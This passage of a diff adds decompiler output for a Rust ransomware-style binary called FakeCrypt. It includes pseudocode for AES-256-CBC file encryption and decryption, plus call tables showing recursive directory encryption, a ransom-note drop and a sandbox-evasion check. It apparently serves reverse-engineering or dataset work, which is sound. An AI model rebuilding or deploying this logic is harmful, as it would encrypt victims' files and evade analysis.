_ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17ha63171d2b15b0f17E(local_200);\n                    /* try { // try from 00150d7d to 00150d86 has its CatchHandler @ 00150de1 */\n          _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17ha63171d2b15b0f17E(local_1e8);\n          uVar2 = 0;\n          goto LAB_00150d5e;\n        }\n      }\n                    /* try { // try from 00150d48 to 00150d51 has its CatchHandler @ 00150dd2 */\n      _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17ha63171d2b15b0f17E(local_200);\n    }\n    uVar2 = CONCAT71(uVar3,1);\n                    /* try { // try from 00150d54 to 00150d5d has its CatchHandler @ 00150de1 */\n    _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17ha63171d2b15b0f17E(local_1e8);\n  }\nLAB_00150d5e:\n  _ZN4core3ptr44drop_in_place_LT_sysinfo__common__System_GT_17hc8fe3377c4e9e53bE(local_1d0);\n  return uVar2 & 0xffffffff;\n}",
+    "_ZN9FakeCrypt7fileops12decrypt_file17h141057e80aed468cE": "void _ZN9FakeCrypt7fileops12decrypt_file17h141057e80aed468cE\n               (undefined8 param_1,undefined8 param_2,undefined8 param_3,undefined8 param_4)\n\n{\n  undefined8 uVar1;\n  undefined auVar2 [16];\n  int local_808;\n  undefined local_801;\n  byte local_800 [4];\n  int local_7fc;\n  undefined8 local_7f0;\n  undefined **local_7e8;\n  undefined8 **local_7e0;\n  undefined8 local_7d8;\n  undefined8 local_7d0;\n  undefined8 *local_7c8;\n  code *local_7c0;\n  undefined *local_7b8;\n  undefined *local_7b0;\n  undefined8 local_7a8;\n  undefined **local_7a0;\n  undefined8 **local_798;\n  undefined8 local_790;\n  undefined8 local_788;\n  undefined local_3e8 [976];\n  \n  local_7d8 = param_1;\n  local_7d0 = param_2;\n  _ZN3std2fs4File4open17hfe7e6621c8fb380dE(local_800,param_1);\n  if ((local_800[0] & 1) == 0) {\n    local_808 = local_7fc;\n    local_7f0 = 0;\n    local_7e8 = (undefined **)0x1;\n    local_7e0 = (undefined8 **)0x0;\n                    /* try { // try from 00155104 to 00155121 has its CatchHandler @ 0015529d */\n    auVar2 = (*(code *)\n               PTR__ZN47__LT_std__fs__File_u20_as_u20_std__io__Read_GT_11read_to_end17h0619605a8d236003E_001deb88\n             )(&local_808,&local_7f0);\n    if (auVar2._0_8_ == 0) {\n                    /* try { // try from 00155151 to 00155248 has its CatchHandler @ 0015529d */\n      _ZN4core3ptr78drop_in_place_LT_core__result__Result_LT_usize_C_std__io__error__Error_GT__GT_17h5f68c5cabed77c10E\n                (0,auVar2._8_8_);\n      _ZN66__LT_aes__autodetect__Aes256_u20_as_u20_crypto_common__KeyInit_GT_3new17hc251919afc52b389E\n                (&local_7a8,param_3);\n      _ZN79__LT_cbc__decrypt__Decryptor_LT_C_GT__u20_as_u20_crypto_common__InnerIvInit_GT_13inner_iv_init17h767b9b8c258b0744E\n                (local_3e8,&local_7a8,param_4);\n      local_7a8 = local_7e8;\n      local_7a0 = local_7e8;\n      local_798 = local_7e0;\n      auVar2 = _ZN6cipher5block15BlockDecryptMut24decrypt_padded_inout_mut17h383e1fa152245349E\n                         (local_3e8,&local_7a8);\n      if (auVar2._0_8_ == 0) {\n        local_7c8 = &local_7d8;\n        local_7c0 = _ZN42__LT__RF_T_u20_as_u20_core__fmt__Debug_GT_3fmt17h7a0a1daf0de9b880E;\n        local_7b8 = &local_801;\n        local_7b0 = \n        PTR__ZN64__LT_block_padding__UnpadError_u20_as_u20_core__fmt__Display_GT_3fmt17h59fde8a55320d860E_001debf8\n        ;\n        local_7a8 = &PTR_s_____Decryption_failed_for_001d95e8;\n        local_7a0 = (undefined **)0x3;\n        local_788 = 0;\n        local_798 = &local_7c8;\n        local_790 = 2;\n        (*(code *)PTR__ZN3std2io5stdio7_eprint17hc8807d5917a19629E_001deb90)(&local_7a8);\n      }\n      else {\n        _ZN3std2fs4File6create17h5c1de6a00e2586b5E(&local_7a8,local_7d8,local_7d0);\n        if ((int)local_7a8 == 0) {\n          local_7c8 = (undefined8 *)CONCAT44(local_7c8._4_4_,local_7a8._4_4_);\n                    /* try { // try from 00155256 to 0015526d has its CatchHandler @ 0015527c */\n          uVar1 = _ZN3std2io5Write9write_all17h61cad997d75bad86E\n                            (&local_7c8,auVar2._0_8_,auVar2._8_8_);\n          _ZN4core3ptr81drop_in_place_LT_core__result__Result_LT__LP__RP__C_std__io__error__Error_GT__GT_17h52eca53ec7fb34e8E\n                    (uVar1);\n          _ZN4core3ptr34drop_in_place_LT_std__fs__File_GT_17hfc222f4db551af96E((int)local_7c8);\n        }\n        else {\n          _ZN4core3ptr86drop_in_place_LT_core__result__Result_LT_std__fs__File_C_std__io__error__Error_GT__GT_17h3f5dd9ad240898e4E\n                    (&local_7a8);\n        }\n      }\n    }\n    else {\n      _ZN4core3ptr78drop_in_place_LT_core__result__Result_LT_usize_C_std__io__error__Error_GT__GT_17h5f68c5cabed77c10E\n                (auVar2._0_8_,auVar2._8_8_);\n    }\n                    /* try { // try from 00155122 to 0015512b has its CatchHandler @ 00155298 */\n    _ZN4core3ptr46drop_in_place_LT_alloc__vec__Vec_LT_u8_GT__GT_17h0777b7bfa8327074E(&local_7f0);\n    _ZN4core3ptr34drop_in_place_LT_std__fs__File_GT_17hfc222f4db551af96E(local_808);\n    if ((local_800[0] & 1) == 0) {\n      return;\n    }\n  }\n  _ZN4core3ptr86drop_in_place_LT_core__result__Result_LT_std__fs__File_C_std__io__error__Error_GT__GT_17h3f5dd9ad240898e4E\n            (local_800);\n  return;\n}",
+    "_ZN9FakeCrypt7fileops12encrypt_file17ha7bc1626977de376E": "void _ZN9FakeCrypt7fileops12encrypt_file17ha7bc1626977de376E\n               (undefined8 param_1,undefined8 param_2,undefined8 param_3,undefined8 param_4)\n\n{\n  ulong uVar1;\n  undefined8 uVar2;\n  undefined auVar3 [16];\n  int local_818;\n  undefined local_811;\n  byte local_810 [4];\n  int local_80c;\n  undefined8 local_800;\n  undefined8 local_7f8;\n  ulong local_7f0;\n  undefined8 local_7e8;\n  undefined8 local_7e0;\n  undefined8 *local_7d8;\n  code *local_7d0;\n  undefined *local_7c8;\n  undefined *local_7c0;\n  undefined8 local_7b8;\n  undefined8 local_7b0;\n  undefined8 **local_7a8;\n  undefined8 local_7a0;\n  undefined8 local_798;\n  undefined local_3f8 [984];\n  \n  local_7e8 = param_1;\n  local_7e0 = param_2;\n  _ZN3std2fs4File4open17hfe7e6621c8fb380dE(local_810,param_1);\n  if ((local_810[0] & 1) == 0) {\n    local_818 = local_80c;\n    local_800 = 0;\n    local_7f8 = 1;\n    local_7f0 = 0;\n                    /* try { // try from 00154ec6 to 00154ee3 has its CatchHandler @ 00155079 */\n    auVar3 = (*(code *)\n               PTR__ZN47__LT_std__fs__File_u20_as_u20_std__io__Read_GT_11read_to_end17h0619605a8d236003E_001deb88\n             )(&local_818,&local_800);\n    if (auVar3._0_8_ == 0) {\n                    /* try { // try from 00154f15 to 00155024 has its CatchHandler @ 00155079 */\n      _ZN4core3ptr78drop_in_place_LT_core__result__Result_LT_usize_C_std__io__error__Error_GT__GT_17h5f68c5cabed77c10E\n                (0,auVar3._8_8_);\n      uVar1 = local_7f0;\n      _ZN5alloc3vec16Vec_LT_T_C_A_GT_6resize17h50c127f716084c0fE\n                (&local_800,(local_7f0 & 0x7ffffffffffffff0) + 0x10,0,&PTR_s_src_fileops_rs_001d95d0\n                );\n      _ZN66__LT_aes__autodetect__Aes256_u20_as_u20_crypto_common__KeyInit_GT_3new17hc251919afc52b389E\n                (&local_7b8,param_3);\n      _ZN79__LT_cbc__decrypt__Decryptor_LT_C_GT__u20_as_u20_crypto_common__InnerIvInit_GT_13inner_iv_init17h767b9b8c258b0744E\n                (local_3f8,&local_7b8,param_4);\n      auVar3 = _ZN6cipher5block15BlockEncryptMut18encrypt_padded_mut17hd555d618ee738abcE\n                         (local_3f8,local_7f8,local_7f0,uVar1);\n      if (auVar3._0_8_ == 0) {\n        local_7d8 = &local_7e8;\n        local_7d0 = _ZN42__LT__RF_T_u20_as_u20_core__fmt__Debug_GT_3fmt17h7a0a1daf0de9b880E;\n        local_7c8 = &local_811;\n        local_7c0 = \n        PTR__ZN62__LT_inout__errors__PadError_u20_as_u20_core__fmt__Display_GT_3fmt17h9b76fa3f5d7cfb5cE_001debf0\n        ;\n        local_7b8 = &PTR_s_____Encryption_failed_for___001d95a0;\n        local_7b0 = 3;\n        local_798 = 0;\n        local_7a8 = &local_7d8;\n        local_7a0 = 2;\n        (*(code *)PTR__ZN3std2io5stdio7_eprint17hc8807d5917a19629E_001deb90)(&local_7b8);\n      }\n      else {\n        _ZN3std2fs4File6create17h5c1de6a00e2586b5E(&local_7b8,local_7e8,local_7e0);\n        if ((int)local_7b8 == 0) {\n          local_7d8 = (undefined8 *)CONCAT44(local_7d8._4_4_,local_7b8._4_4_);\n                    /* try { // try from 00155032 to 00155049 has its CatchHandler @ 00155058 */\n          uVar2 = _ZN3std2io5Write9write_all17h61cad997d75bad86E\n                            (&local_7d8,auVar3._0_8_,auVar3._8_8_);\n          _ZN4core3ptr81drop_in_place_LT_core__result__Result_LT__LP__RP__C_std__io__error__Error_GT__GT_17h52eca53ec7fb34e8E\n                    (uVar2);\n          _ZN4core3ptr34drop_in_place_LT_std__fs__File_GT_17hfc222f4db551af96E((int)local_7d8);\n        }\n        else {\n          _ZN4core3ptr86drop_in_place_LT_core__result__Result_LT_std__fs__File_C_std__io__error__Error_GT__GT_17h3f5dd9ad240898e4E\n                    (&local_7b8);\n        }\n      }\n    }\n    else {\n      _ZN4core3ptr78drop_in_place_LT_core__result__Result_LT_usize_C_std__io__error__Error_GT__GT_17h5f68c5cabed77c10E\n                (auVar3._0_8_,auVar3._8_8_);\n    }\n                    /* try { // try from 00154ee4 to 00154eed has its CatchHandler @ 00155074 */\n    _ZN4core3ptr46drop_in_place_LT_alloc__vec__Vec_LT_u8_GT__GT_17h0777b7bfa8327074E(&local_800);\n    _ZN4core3ptr34drop_in_place_LT_std__fs__File_GT_17hfc222f4db551af96E(local_818);\n    if ((local_810[0] & 1) == 0) {\n      return;\n    }\n  }\n  _ZN4core3ptr86drop_in_place_LT_core__result__Result_LT_std__fs__File_C_std__io__error__Error_GT__GT_17h3f5dd9ad240898e4E\n            (local_810);\n  return;\n}"
+  },
+  "function_call_counts": {
+    "_ZN9FakeCrypt7fileops16drop_ransom_note17h4942ecd79881b15cE": {
+      "std::path::Path::join": 1,
+      "core::ptr::drop_in_place<std::path::PathBuf>": 1,
+      "core::ptr::drop_in_place<std::fs::File>": 1,
+      "std::io::Write::write_all": 1,
+      "core::ptr::drop_in_place<core::result::Result<std::fs::File,std::io::error::Error>>": 1,
+      "core::ptr::drop_in_place<core::result::Result<(),std::io::error::Error>>": 1,
+      "std::fs::File::create": 1
+    },
+    "_ZN9FakeCrypt7fileops17decrypt_directory17h7bfbee2fc08c838dE": {
+      "core::ptr::drop_in_place<std::path::PathBuf>": 1,
+      "std::fs::read_dir": 1,
+      "FakeCrypt::fileops::decrypt_directory": 1,
+      "core::ptr::drop_in_place<core::iter::adapters::flatten::Flatten<std::fs::ReadDir>>": 1,
+      "core::ptr::drop_in_place<std::fs::DirEntry>": 1,
+      "core::ptr::drop_in_place<core::result::Result<std::fs::ReadDir,std::io::error::Error>>": 1,
+      "FakeCrypt::fileops::decrypt_file": 1,
+      "<core::iter::adapters::flatten::FlattenCompat<I,U> as core::iter::traits::iterator::Iterator>::next": 1
+    },
+    "_ZN9FakeCrypt7fileops17encrypt_directory17hb6c6db8e2661d1b6E": {
+      "core::ptr::drop_in_place<std::path::PathBuf>": 1,
+      "std::fs::read_dir": 1,
+      "core::ptr::drop_in_place<core::iter::adapters::flatten::Flatten<std::fs::ReadDir>>": 1,
+      "FakeCrypt::fileops::encrypt_directory": 1,
+      "core::ptr::drop_in_place<std::fs::DirEntry>": 1,
+      "core::ptr::drop_in_place<core::result::Result<std::fs::ReadDir,std::io::error::Error>>": 1,
+      "FakeCrypt::fileops::encrypt_file": 1,
+      "<core::iter::adapters::flatten::FlattenCompat<I,U> as core::iter::traits::iterator::Iterator>::next": 1
+    },
+    "_ZN9FakeCrypt4main17h8f6c4810655a0166E": {
+      "core::iter::traits::iterator::Iterator::collect": 1,
+      "FakeCrypt::fileops::drop_ransom_note": 1,
+      "core::ptr::drop_in_place<core::result::Result<std::fs::Metadata,std::io::error::Error>>": 1,
+      "core::result::Result<T,E>::expect": 2,
+      "core::result::Result<T,E>::unwrap": 1,
+      "std::fs::File::create": 1,
+      "rand::rng::Rng::fill": 1,
+      "FakeCrypt::fileops::decrypt_directory": 1,
+      "FakeCrypt::fileops::encrypt_directory": 1,
+      "core::ptr::drop_in_place<rand::rngs::thread::ThreadRng>": 1,
+      "core::ptr::drop_in_place<alloc::vec::Vec<alloc::string::String>>": 1,
+      "<core::ops::range::Range<usize> as core::slice::index::SliceIndex<[T]>>::index": 2,
+      "<[A] as core::slice::cmp::SlicePartialEq<B>>::equal": 2,
+      "core::ptr::drop_in_place<alloc::vec::Vec<u8>>": 1,
+      "FakeCrypt::stealth::is_sandbox": 1,
+      "core::ptr::drop_in_place<std::fs::File>": 2,
+      "std::io::Write::write_all": 2,
+      "std::fs::metadata": 1,
+      "std::fs::File::open": 1
+    },
+    "_ZN9FakeCrypt7stealth10is_sandbox17hafd329d2780dcab4E": {
+      "core::ptr::drop_in_place<alloc::borrow::Cow<str>>": 1,
+      "core::ptr::drop_in_place<std::ffi::os_str::OsString>": 1,
+      "core::ptr::drop_in_place<sysinfo::common::System>": 1,
+      "core::result::Result<T,E>::unwrap_or_default": 1,
+      "whoami::api::username": 1,
+      "core::ptr::drop_in_place<alloc::string::String>": 5,
+      "<core::slice::iter::Iter<T> as core::iter::traits::iterator::Iterator>::any": 2
+    },
+    "_ZN9FakeCrypt7fileops12decrypt_file17h141057e80aed468cE": {
+      "<cbc::decrypt::Decryptor<C> as crypto_common::InnerIvInit>::inner_iv_init": 1,
+      "cipher::block::BlockDecryptMut::decrypt_padded_inout_mut": 1,
+      "core::ptr::drop_in_place<core::result::Result<usize,std::io::error::Error>>": 2,
+      "core::ptr::drop_in_place<alloc::vec::Vec<u8>>": 1,
+      "std::fs::File::create": 1,
+      "core::ptr::drop_in_place<core::result::Result<(),std::io::error::Error>>": 1,
+      "core::ptr::drop_in_place<std::fs::File>": 2,
+      "<aes::autodetect::Aes256 as crypto_common::KeyInit>::new": 1,
+      "std::io::Write::write_all": 1,
+      "core::ptr::drop_in_place<core::result::Result<std::fs::File,std::io::error::Error>>": 2,
+      "std::fs::File::open": 1
+    },
+    "_ZN9FakeCrypt7fileops12encrypt_file17ha7bc1626977de376E": {
+      "<cbc::decrypt::Decryptor<C> as crypto_common::InnerIvInit>::inner_iv_init": 1,
+      "core::ptr::drop_in_place<core::result::Result<usize,std::io::error::Error>>": 2,
+      "cipher::block::BlockEncryptMut::encrypt_padded_mut": 1,
+      "core::ptr::drop_in_place<alloc::vec::Vec<u8>>": 1,
+      "std::fs::File::create": 1,
+      "core::ptr::drop_in_place<core::result::Result<(),std::io::error::Error>>": 1,
+      "alloc::vec::Vec<T,A>::resize": 1,
+      "core::ptr::drop_in_place<std::fs::File>": 2,
+      "<aes::autodetect::Aes256 as crypto_common::KeyInit>::new": 1,
+      "std::io::Write::write_all": 1,
+      "core::ptr::drop_in_place<core::result::Result<std::fs::File,std::io::error::Error>>": 2,
+      "std::fs::File::open": 1
+    }
+  },
+  "macro_call_counts": {
+    "_ZN9FakeCrypt7fileops16drop_ransom_note17h4942ecd79881b15cE": {},
+    "_ZN9FakeCrypt7fileops17decrypt_directory17h7bfbee2fc08c838dE": {},
+    "_ZN9FakeCrypt7fileops17encrypt_directory17hb6c6db8e2661d1b6E": {},
+    "_ZN9FakeCrypt4main17h8f6c4810655a0166E": {},
+    "_ZN9FakeCrypt7stealth10is_sandbox17hafd329d2780dcab4E": {},
+    "_ZN9FakeCrypt7fileops12decrypt_file17h141057e80aed468cE": {},
+    "_ZN9FakeCrypt7fileops12encrypt_file17ha7bc1626977de376E": {}
+  },
+  "variable_types": {
+    "_ZN9FakeCrypt7fileops16drop_ransom_note17h4942ecd79881b15cE": {
+      "stack_8": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "reg_rax": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_20": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_44": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_32": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "stack_60": [
+        [
+          "array",
+          24
+        ]
+      ],
+      "stack_40": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "stack_28": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "stack_16": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "stack_4": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "stack_12": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "stack_0": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "stack_36": [
+        [
+          "primitive",
+          4
+        ]
+      ]
+    },
+    "_ZN9FakeCrypt7fileops17decrypt_directory17h7bfbee2fc08c838dE": {
+      "stack_108": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "stack_128": [
+        [
+          "array",
+          48
+        ]
+      ],
+      "reg_rcx": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rax": [
+        [
+          "primitive",
+          1
+        ]
+      ],
+      "stack_52": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "stack_96": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "stack_32": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_92": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "stack_72": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_232": [
+        [
+          "primitive",
+          1
+        ]
+      ],
+      "stack_112": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "stack_16": [
+        [
+          "array",
+          8
+        ]
+      ],
+      "stack_176": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_116": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "stack_0": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_56": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "reg_rdx": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_8": [
+        [
+          "primitive",
+          1
+        ]
+      ],
+      "reg_rsi": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_64": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "stack_44": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "stack_88": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "stack_60": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "reg_rdi": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_40": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "stack_100": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "stack_120": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_68": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "stack_24": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_104": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "stack_48": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "stack_224": [
+        [
+          "primitive",
+          8
+        ]
+      ]
+    },
+    "_ZN9FakeCrypt7fileops17encrypt_directory17hb6c6db8e2661d1b6E": {
+      "stack_108": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "stack_128": [
+        [
+          "array",
+          48
+        ]
+      ],
+      "reg_rcx": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rax": [
+        [
+          "primitive",
+          1
+        ]
+      ],
+      "stack_52": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "stack_96": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "stack_32": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_92": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "stack_72": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_232": [
+        [
+          "primitive",
+          1
+        ]
+      ],
+      "stack_16": [
+        [
+          "array",
+          8
+        ]
+      ],
+      "stack_112": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "stack_176": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_0": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_56": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "stack_116": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "reg_rdx": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_8": [
+        [
+          "primitive",
+          1
+        ]
+      ],
+      "reg_rsi": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_64": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "stack_44": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "stack_88": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "stack_60": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "reg_rdi": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_40": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "stack_100": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "stack_120": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_68": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "stack_24": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_104": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "stack_48": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "stack_224": [
+        [
+          "primitive",
+          8
+        ]
+      ]
+    },
+    "_ZN9FakeCrypt4main17h8f6c4810655a0166E": {
+      "stack_304": [
+        [
+          "&reference",
+          8
+        ]
+      ],
+      "reg_rax": [
+        [
+          "&primitive",
+          8
+        ],
+        [
+          "primitive",
+          8
+        ],
+        [
+          "primitive",
+          4
+        ],
+        [
+          "primitive",
+          1
+        ]
+      ],
+      "stack_97": [
+        [
+          "primitive",
+          7
+        ]
+      ],
+      "stack_32": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_93": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "stack_72": [
+        [
+          "&primitive",
+          8
+        ]
+      ],
+      "stack_16": [
+        [
+          "&reference",
+          8
+        ]
+      ],
+      "stack_112": [
+        [
+          "primitive",
+          1
+        ]
+      ],
+      "stack_296": [
+        [
+          "array",
+          8
+        ]
+      ],
+      "stack_56": [
+        [
+          "&reference",
+          8
+        ]
+      ],
+      "stack_0": [
+        [
+          "&reference",
+          8
+        ]
+      ],
+      "stack_256": [
+        [
+          "&primitive",
+          8
+        ]
+      ],
+      "stack_113": [
+        [
+          "primitive",
+          7
+        ]
+      ],
+      "stack_312": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rdx": [
+        [
+          "&reference",
+          8
+        ]
+      ],
+      "stack_8": [
+        [
+          "&primitive",
+          8
+        ]
+      ],
+      "stack_80": [
+        [
+          "primitive",
+          1
+        ]
+      ],
+      "stack_64": [
+        [
+          "&primitive",
+          8
+        ]
+      ],
+      "stack_85": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "stack_280": [
+        [
+          "array",
+          16
+        ]
+      ],
+      "stack_81": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "stack_40": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_320": [
+        [
+          "&reference",
+          8
+        ]
+      ],
+      "stack_264": [
+        [
+          "&primitive",
+          8
+        ]
+      ],
+      "stack_24": [
+        [
+          "&primitive",
+          8
+        ]
+      ],
+      "stack_104": [
+        [
+          "primitive",
+          1
+        ]
+      ],
+      "stack_89": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "stack_105": [
+        [
+          "primitive",
+          7
+        ]
+      ],
+      "reg_zf": [
+        [
+          "primitive",
+          1
+        ]
+      ]
+    },
+    "_ZN9FakeCrypt7stealth10is_sandbox17hafd329d2780dcab4E": {
+      "stack_8": [
+        [
+          "&reference",
+          8
+        ]
+      ],
+      "reg_rax": [
+        [
+          "primitive",
+          1
+        ],
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_32": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_40": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_72": [
+        [
+          "array",
+          360
+        ]
+      ],
+      "stack_16": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_24": [
+        [
+          "array",
+          8
+        ]
+      ],
+      "stack_0": [
+        [
+          "&reference",
+          8
+        ]
+      ],
+      "stack_48": [
+        [
+          "array",
+          24
+        ]
+      ],
+      "stack_432": [
+        [
+          "primitive",
+          8
+        ]
+      ]
+    },
+    "_ZN9FakeCrypt7fileops12decrypt_file17h141057e80aed468cE": {
+      "stack_128": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rcx": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rax": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_96": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_32": [
+        [
+          "&reference",
+          8
+        ]
+      ],
+      "stack_1056": [
+        [
+          "array",
+          976
+        ]
+      ],
+      "stack_72": [
+        [
+          "&primitive",
+          8
+        ]
+      ],
+      "stack_112": [
+        [
+          "&reference",
+          8
+        ]
+      ],
+      "stack_0": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "stack_12": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "stack_56": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rdx": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_7": [
+        [
+          "primitive",
+          1
+        ]
+      ],
+      "stack_8": [
+        [
+          "array",
+          4
+        ]
+      ],
+      "reg_rsi": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_80": [
+        [
+          "&primitive",
+          8
+        ]
+      ],
+      "stack_64": [
+        [
+          "&primitive",
+          8
+        ]
+      ],
+      "stack_88": [
+        [
+          "&primitive",
+          8
+        ]
+      ],
+      "reg_rdi": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_40": [
+        [
+          "&reference",
+          8
+        ]
+      ],
+      "stack_120": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_24": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_104": [
+        [
+          "&reference",
+          8
+        ]
+      ],
+      "stack_48": [
+        [
+          "primitive",
+          8
+        ]
+      ]
+    },
+    "_ZN9FakeCrypt7fileops12encrypt_file17ha7bc1626977de376E": {
+      "stack_128": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rcx": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "reg_rax": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_96": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_32": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_1056": [
+        [
+          "array",
+          984
+        ]
+      ],
+      "stack_72": [
+        [
+          "&primitive",
+          8
+        ]
+      ],
+      "stack_112": [
+        [
+          "&reference",
+          8
+        ]
+      ],
+      "stack_56": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_0": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "stack_12": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "reg_rdx": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_7": [
+        [
+          "primitive",
+          1
+        ]
+      ],
+      "stack_8": [
+        [
+          "array",
+          4
+        ]
+      ],
+      "reg_rsi": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_80": [
+        [
+          "&primitive",
+          8
+        ]
+      ],
+      "stack_64": [
+        [
+          "&primitive",
+          8
+        ]
+      ],
+      "stack_88": [
+        [
+          "&primitive",
+          8
+        ]
+      ],
+      "reg_rdi": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_40": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_120": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_104": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_24": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_48": [
+        [
+          "primitive",
+          8
+        ]
+      ]
+    }
+  }
+}
